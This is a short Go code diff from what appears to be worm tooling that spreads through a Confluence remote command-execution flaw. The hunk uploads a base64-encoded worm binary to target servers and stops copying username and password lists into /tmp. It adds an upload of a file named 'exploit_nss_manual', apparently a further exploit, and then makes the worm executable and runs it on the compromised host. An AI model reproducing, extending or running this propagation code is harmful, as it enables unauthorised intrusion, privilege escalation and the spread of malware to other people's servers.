@@ -83,15 +83,9 @@ func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string 
 		worm64 := base64.StdEncoding.EncodeToString(worm)
     CopyWorm(url, endpoint, worm64, wormPath)
 
-		usersFile := GetFile("./users.txt")
-		usersFile64 := base64.StdEncoding.EncodeToString(usersFile)
-		command := fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
-		ConfluenceCmdExecute(url, endpoint, command)
-
-		passwordFile := GetFile("./passwords.txt")
-		passwordFile64 := base64.StdEncoding.EncodeToString(passwordFile)
-		command = fmt.Sprintf(copyTemplate, passwordFile64, "/tmp/passwords.txt")
-		ConfluenceCmdExecute(url, endpoint, command)
+    worm = GetFile("./exploit_nss_manual")
+		worm64 = base64.StdEncoding.EncodeToString(worm)
+    CopyWorm(url, endpoint, worm64, "/tmp/exploit_nss_manual")    
 
 		command = fmt.Sprintf("chmod u+x %s; %s", wormPath, wormPath)
 		ConfluenceCmdExecute(url, endpoint, command)
